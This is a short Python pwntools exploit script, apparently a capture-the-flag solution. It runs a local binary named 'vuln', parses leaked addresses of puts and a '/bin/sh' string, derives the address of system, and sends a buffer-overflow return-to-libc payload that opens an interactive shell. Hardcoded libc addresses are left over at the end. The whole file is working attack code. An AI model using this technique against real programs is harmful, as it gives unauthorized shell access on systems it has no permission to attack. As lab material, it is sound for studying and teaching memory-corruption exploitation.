import pwn
import re
padding = 'A' * 160
gdb_puts = 0xf7e3be30
gdb_system = 0xf7e117e0
offset = gdb_puts - gdb_system

elf = pwn.ELF("./vuln")
process = elf.process()

prompt = process.recv()


puts_addr = int(re.findall('puts: (.*)', prompt)[0],16)
bin_sh_addr = int(re.findall('useful_string: (.*)', prompt)[0],16)

print prompt

system = puts_addr - offset
print hex(puts_addr)
print hex(bin_sh_addr)

payload = padding + pwn.p32(system) + "CCCC" + pwn.p32(bin_sh_addr) 
process.sendline(payload)
process.interactive()

pts = 0xf7621140

sys = 0xf75fc940